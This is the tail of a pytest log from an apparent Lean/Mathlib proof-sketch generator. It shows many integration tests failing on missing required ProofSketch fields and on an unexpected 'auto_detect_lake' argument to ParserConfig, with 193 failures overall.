    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
ERROR tests/integration/test_full_pipeline.py::TestFullPipeline::test_async_animation_pipeline - pydantic_core._pydantic_core.ValidationError: 9 validation errors for ProofSketch
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
ERROR tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_mathlib_sketch_enhancement - pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
theorem_statement
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
ERROR tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_notation_table_generation - pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
theorem_statement
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
ERROR tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_complexity_assessment - pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
theorem_statement
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
ERROR tests/integration/test_mathlib_real.py::TestMarkdownExporter::test_mathlib_export - pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
theorem_statement
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
ERROR tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_parse_and_generate_simple - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
ERROR tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_parse_and_generate_induction - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
ERROR tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_parse_and_generate_multiple - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
ERROR tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_mathematical_context_generation - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
ERROR tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_error_recovery - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
ERROR tests/integration/test_parser_generator.py::TestParserGeneratorIntegration::test_caching_integration - TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
ERROR tests/unit/test_mathlib_integration.py::test_educational_content_quality
ERROR tests/unit/test_mathlib_integration.py::test_export_pipeline_integration
= 193 failed, 78 passed, 7 skipped, 21 warnings, 14 errors in 69.04s (0:01:09) =
